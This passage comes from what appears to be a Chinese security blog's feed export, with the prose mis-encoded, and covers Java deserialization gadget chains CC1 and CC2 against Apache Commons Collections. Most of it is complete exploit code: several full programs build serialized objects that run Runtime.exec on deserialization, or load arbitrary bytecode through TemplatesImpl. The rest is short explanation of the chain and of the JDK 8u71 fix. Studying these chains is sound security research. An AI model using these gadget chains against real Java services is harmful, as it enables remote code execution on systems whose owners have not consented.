å¯ä»¥é€šè¿‡ChainedTransformeré“¾å¼è°ƒç”¨æ”¹å†™ã€‚</span><br>        <br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-comment">//keyæ”¹ä¸ºTargetçš„æˆå‘˜æ–¹æ³•</span><br>        map.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>);<br>        Map&lt;Object,Object&gt; transformerMap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, chainedTransformer);<br>		<br>        <br>        Class&lt;?&gt; c = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; annotationInvocationdhdlConstructor = c.getDeclaredConstructor(Class.class, Map.class);<br>        annotationInvocationdhdlConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">//è¿™é‡Œæ”¹ä¸ºTarget.class</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> annotationInvocationdhdlConstructor.newInstance(Target.class, transformerMap );<br><br>        SER(o);<br>        UNSER(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">SER</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">UNSER</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>è§£å†³é—®é¢˜ä¸‰ï¼š</p>
<p><code>ConstantTransformer.transform</code>ç›¸å½“äºä¼ å…¥ä»€ä¹ˆå°±è¿”å›ä»€ä¹ˆï¼Œè¿™å°±å¾ˆæ–¹ä¾¿æˆ‘ä»¬äº†ï¼Œæˆ‘ä»¬å¯ä»¥ä¼ å…¥(Runtime.class)</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240523194708176.png" alt="image-20240523194708176"></p>
<h3 id="å®Œæ•´ä»£ç "><a href="#å®Œæ•´ä»£ç " class="headerlink" title="å®Œæ•´ä»£ç "></a>å®Œæ•´ä»£ç </h3><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>);<br>        Map&lt;Object,Object&gt; transformerMap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, chainedTransformer);<br><br>        Class&lt;?&gt; c = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; annotationInvocationdhdlConstructor = c.getDeclaredConstructor(Class.class, Map.class);<br>        annotationInvocationdhdlConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> annotationInvocationdhdlConstructor.newInstance(Target.class, transformerMap );<br><br>        SER(o);<br><span class="hljs-comment">//        UNSER(&quot;ser.bin&quot;);</span><br><br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">SER</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">UNSER</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="ysoserialç‰ˆæœ¬CC1"><a href="#ysoserialç‰ˆæœ¬CC1" class="headerlink" title="ysoserialç‰ˆæœ¬CC1"></a>ysoserialç‰ˆæœ¬CC1</h2><p><img src="https://image.sp4rks.xyz/2024/06/image-20240523202238209.png" alt="image-20240523202238209"></p>
<p>å…¶å®è¿™åé¢è¿™éƒ¨åˆ†å’ŒTransformMapç‰ˆæœ¬æ˜¯ä¸€æ ·çš„ã€‚æˆ‘ä»¬å½“æ—¶æƒ³è°ƒç”¨<code>TransformMap.transform()</code>æ–¹æ³•ï¼ŒTransformMapç‰ˆæœ¬ä½¿ç”¨çš„æ˜¯<code>TransformMap.checkSetValue()</code>ã€‚ysoserialç‰ˆæœ¬ä½¿ç”¨çš„æ˜¯<code>LazyMap.get()</code>ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240523202537062.png" alt="image-20240523202537062"></p>
<p> factoryæ­£å¥½ä¼ å…¥æˆ‘ä»¬ä¹‹å‰çš„<code>ChainedTransformer</code></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240523210551073.png" alt="image-20240523210551073"></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240523210636955.png" alt="image-20240523210636955"></p>
<p>LazyMapçš„æ„æ€æ˜¯ä¸€å¼€å§‹ä¸å†™keyï¼Œç­‰è°ƒç”¨çš„æ—¶å€™é€šè¿‡transform()è°ƒç”¨keyï¼Œæ‰€ä»¥ä¸€å¼€å§‹è¦ç¡®ä¿æ²¡æœ‰key;</p>
<p>æ¥ä¸‹æ¥å°±æ‰¾è°è°ƒç”¨äº†get(),æ‰¾åˆ°äº†<code>AnnotationInvocationHandler.invoke()</code>ï¼Œè€ŒåŠ¨æ€ä»£ç†ç±»ä¼šè‡ªåŠ¨æ‰§è¡Œinvokeæ–¹æ³•ï¼Œè¿‡è¿™é‡Œçš„åˆ¤æ–­å¾ˆç®€å•ï¼Œåªéœ€è¦ä¸è°ƒç”¨equlsæ–¹æ³•å’Œä¸è°ƒç”¨æœ‰å‚æ–¹æ³•å°±èƒ½è¿‡è¿™ä¸¤ä¸ªifã€‚</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240523211936873.png" alt="image-20240523211936873"></p>
<p><code>AnnotationInvocationHandler</code>ä»åå­—æ¥çœ‹å°±æ˜¯åŠ¨æ€å¤„ç†å™¨ç±»åˆæ­£å¥½<code>AnnotationInvocationHandler.readObject</code> è°ƒç”¨äº†<code>entrySet()</code>æ­£å¥½æ’åœ¨æªå£ä¸Šã€‚menberValuesåˆå¯æ§ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240523212053262.png" alt="image-20240523212053262"></p>
<h3 id="å®Œæ•´ä»£ç -1"><a href="#å®Œæ•´ä»£ç -1" class="headerlink" title="å®Œæ•´ä»£ç "></a>å®Œæ•´ä»£ç </h3><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);<br><br>        Class&lt;?&gt; c = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; annotationInvocationdhdlConstructor = c.getDeclaredConstructor(Class.class, Map.class);<br>        annotationInvocationdhdlConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>       <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span>(InvocationHandler) annotationInvocationdhdlConstructor.newInstance(Target.class, lazyMap );<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">mapProxy</span> <span class="hljs-operator">=</span> (Map)Proxy.newProxyInstance(LazyMap.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, h);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> annotationInvocationdhdlConstructor.newInstance(Target.class, mapProxy);<br><br><br><span class="hljs-comment">//        SER(o);</span><br>        UNSER(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br>     <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">SER</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">UNSER</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<h2 id="è°ƒç”¨é“¾"><a href="#è°ƒç”¨é“¾" class="headerlink" title="è°ƒç”¨é“¾"></a>è°ƒç”¨é“¾</h2><p><img src="https://image.sp4rks.xyz/2024/06/image-20240523205520055.png" alt="image-20240523205520055"></p>
<h2 id="åç»­å®˜æ–¹ä¿®å¤æ–¹å¼"><a href="#åç»­å®˜æ–¹ä¿®å¤æ–¹å¼" class="headerlink" title="åç»­å®˜æ–¹ä¿®å¤æ–¹å¼"></a>åç»­å®˜æ–¹ä¿®å¤æ–¹å¼</h2><h3 id="å¯¹äºTransformMapç‰ˆ"><a href="#å¯¹äºTransformMapç‰ˆ" class="headerlink" title="å¯¹äºTransformMapç‰ˆ"></a>å¯¹äºTransformMapç‰ˆ</h3><p>JDK 8u71 åŠä»¥åçš„ç‰ˆæœ¬æ²¡æœ‰äº†èƒ½è°ƒç”¨ ReadObject ä¸­ <code>setValue()</code> æ–¹æ³•çš„åœ°æ–¹ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2024/06/2024-05-24%20110816.png" alt="2024-05-24 110816"></p>
<h3 id="å¯¹äºysoserialç‰ˆ"><a href="#å¯¹äºysoserialç‰ˆ" class="headerlink" title="å¯¹äºysoserialç‰ˆ"></a>å¯¹äºysoserialç‰ˆ</h3><p>å› ä¸ºåœ¨8u71ä¹‹åçš„ç‰ˆæœ¬ååºåˆ—åŒ–ä¸å†é€šè¿‡<code>defaultReadObject</code>æ–¹å¼ï¼Œè€Œæ˜¯é€šè¿‡<code>readFields</code> æ¥è·å–å‡ ä¸ªç‰¹å®šçš„å±æ€§ï¼Œ<code>defaultReadObject</code> å¯ä»¥æ¢å¤å¯¹è±¡æœ¬èº«çš„ç±»å±æ€§ï¼Œæ¯”å¦‚<code>this.memberValues</code> å°±èƒ½æ¢å¤æˆæˆ‘ä»¬åŸæœ¬è®¾ç½®çš„æ¶æ„ç±»ï¼Œä½†é€šè¿‡<code>readFields</code>æ–¹å¼ï¼Œ<code>this.memberValues</code> å°±ä¸ºnullï¼Œæ‰€ä»¥åç»­æ‰§è¡Œget()å°±å¿…ç„¶æ²¡å‘è§¦å‘ï¼Œè¿™ä¹Ÿå°±æ˜¯é«˜ç‰ˆæœ¬ä¸èƒ½ä½¿ç”¨çš„åŸå› ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240524111729060.png" alt="image-20240524111729060"></p>
<p><img src="https://image.sp4rks.xyz/2024/06/2024-05-24%20111150.png" alt="2024-05-24 111150"></p>
<h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><a href="https://blinkfox.github.io/2018/09/13/hou-duan/java/commons/commons-collections-bao-he-jian-jie/">Apache Commons CollectionsåŒ…å’Œç®€ä»‹</a></p>
<p><a href="https://www.bilibili.com/video/BV1no4y1U7E1/?spm_id_from=333.999.0.0&vd_source=d195054a6a081ba07486dcc86c6ba707">Javaååºåˆ—åŒ–CommonsCollectionsç¯‡(ä¸€) CC1é“¾æ‰‹å†™EXP</a></p>
<p><a href="https://drun1baby.top/2022/06/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8701-CC1%E9%93%BE/">Javaååºåˆ—åŒ–Commons-Collectionsç¯‡01-CC1é“¾</a></p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVAå®‰å…¨</tag>
      </tags>
  </entry>
  <entry>
    <title>Javaååºåˆ—åŒ–CommonsCollectionsç¯‡-CC2</title>
    <url>/2024/06/02/JAVA%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC2/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>CC3ä¸­æˆ‘ä»¬äº†è§£åˆ°<code>TemplatesImpl()</code>è°ƒç”¨<code>Transformer()</code>æ–¹æ³•å°±å¯ä»¥ä»£ç æ‰§è¡Œã€‚</p>
<p>CC2å°±åœ¨åœ¨è¿™ä¸ªåŸºç¡€ä¸Šï¼Œç»“åˆCC4æ”¹å†™ã€‚CC2æœ€å¤§çš„ä¼˜åŠ¿å°±æ˜¯ä¸ç”¨<code>Transformer</code> æ•°ç»„ã€‚</p>
<h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><ul>
<li>JDK8u65</li>
<li>CommonsCollections4</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.commons<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections4<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure>



<h2 id="CC2è°ƒç”¨é“¾åˆ†æ"><a href="#CC2è°ƒç”¨é“¾åˆ†æ" class="headerlink" title="CC2è°ƒç”¨é“¾åˆ†æ"></a>CC2è°ƒç”¨é“¾åˆ†æ</h2><p><img src="https://image.sp4rks.xyz/2024/06/CC2.png" alt="CC2"></p>
<h2 id="å®Œæ•´ä»£ç "><a href="#å®Œæ•´ä»£ç " class="headerlink" title="å®Œæ•´ä»£ç "></a>å®Œæ•´ä»£ç </h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//æ‰§è¡Œä»£ç çš„ç±»</span><br>        <span class="hljs-comment">//å’ŒCC4ä¸€æ ·</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C://Users//14341//Desktop/Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br><br>		<span class="hljs-comment">//æ„é€ InvokerTransformerç±»å»è°ƒç”¨templateså¯¹è±¡çš„newTransformer()æ–¹æ³•</span><br>        InvokerTransformer&lt;Object, Object&gt; invokerTransformer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>&lt;&gt;(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;);<br><br>        <span class="hljs-comment">//åˆ›å»ºTransformingComparatorç±»å¯¹è±¡ï¼Œä¼ â¼Šä¸€ä¸ªä¸´æ—¶çš„Transformerç±»å¯¹è±¡(ConstantTransformer)ï¼Œè®©ä»£ç åºåˆ—åŒ–çš„æ—¶å€™ä¸æ‰§è¡Œï¼Œåœ¨ååºåˆ—åŒ–çš„æ—¶å€™æ‰§è¡Œã€‚</span><br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>&lt;&gt;(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>&lt;&gt;(<span class="hljs-number">1</span>));<br>        <br>        <br>        <span class="hljs-comment">//åˆ›å»º PriorityQueueç±»å¯¹è±¡ä¼ å…¥transformingComparatorå¯¹è±¡ï¼Œä½†æ˜¯æ­¤æ—¶å‘é˜Ÿåˆ—â¾¥æ·»åŠ çš„å…ƒç´ å°±æ˜¯æˆ‘ä»¬å‰â¾¯åˆ›å»ºçš„ TemplatesImplå¯¹è±¡äº†ï¼Œè¿™æ˜¯å› ä¸ºæœ€åè°ƒç”¨ PriorityQueue.compare() çš„æ—¶å€™æ˜¯ä¼ å…¥é˜Ÿåˆ—ä¸­çš„ä¸¤ä¸ªå¯¹è±¡ï¼Œç„¶å compare()ä¸­è°ƒç”¨ Transformer.transform(obj1) çš„æ—¶å€™ç”¨çš„æ˜¯ä¼ å…¥çš„ç¬¬ä¸€ä¸ªå¯¹è±¡ä½œä¸ºå‚æ•°ï¼Œå› æ­¤è¿™é‡Œéœ€è¦å°†priorityQueueé˜Ÿåˆ—ä¸­çš„ç¬¬ä¸€ä¸ªå¯¹è±¡è®¾ç½®ä¸ºæ„é€ å¥½çš„ templates å¯¹è±¡ã€‚</span><br>        <span class="hljs-comment">//PriorityQueueè°ƒç”¨TransformingComparator.compare()</span><br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);<br>        priorityQueue.add(templates);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> transformingComparator.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">transformerField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;transformer&quot;</span>);<br>        transformerField.setAccessible(<span class="hljs-literal">true</span>);<br>        transformerField.set(transformingComparator, invokerTransformer);<br><br>        serialize(priorityQueue);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oss</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oss.writeObject(obj);<br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="https://image.sp4rks.xyz/2024/06/image-20240602022510898.png" alt="image-20240602022510898"></p>
<h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><a href="https://www.bilibili.com/video/BV1NQ4y1q7EU/?spm_id_from=333.999.0.0&vd_source=d195054a6a081ba07486dcc86c6ba707">Javaååºåˆ—åŒ–CommonsCollectionsç¯‡(å››)-æ‘†çƒ‚çš„å®Œç»“ç¯‡</a></p>
